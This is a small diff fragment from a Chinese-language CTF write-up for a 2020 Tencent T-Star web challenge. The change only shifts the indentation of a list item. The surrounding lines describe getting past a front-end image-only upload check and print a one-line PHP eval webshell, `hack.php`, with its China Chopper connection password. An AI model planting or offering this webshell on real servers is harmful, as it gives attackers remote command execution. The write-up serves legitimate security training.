@@ -7,7 +7,7 @@ description: 2020 | 腾讯犀牛鸟网络安全 | T-Star-高校挑战赛 | Web
 
 - 题目需要上传一个`webshell`到服务器，但是前端有 JS 校验，导致只能上传图片<br>
 ![IMG ONLY](img/t_star_upload_bypass01.jpg)
-  - `hack.php`
+    - `hack.php`
     ```bash
     <?php @eval($_POST['hack']);?>
     # hack 为菜刀连接使用的密码
